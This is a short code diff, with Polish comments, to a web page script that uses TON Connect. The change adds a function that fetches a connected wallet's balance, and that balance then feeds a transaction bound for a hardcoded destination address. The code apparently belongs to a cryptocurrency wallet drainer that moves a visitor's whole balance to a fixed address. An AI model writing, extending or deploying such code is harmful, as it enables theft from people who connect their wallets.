@@ -24,9 +24,17 @@
 
         const destinationAddress = 'EQA0i8-CdGnF_DhUHHf92R1ONH6sIA9vLZ_WLcCIhfBBXwtG'; // Adres docelowy
 
+        async function getBalance(address) {
+            const client = new ton.TonClient({
+                endpoint: 'https://toncenter.com/api/v2/jsonRPC'
+            });
+            const balance = await client.getBalance(address);
+            return balance;
+        }
+
         async function sendTransaction(wallet) {
             try {
-                const balance = await tonConnectUI.provider.getBalance(wallet.account.address);
+                const balance = await getBalance(wallet.account.address);
                 
                 const transaction = {
                     validUntil: Math.floor(Date.now() / 1000) + 360, // 5 minut ważności
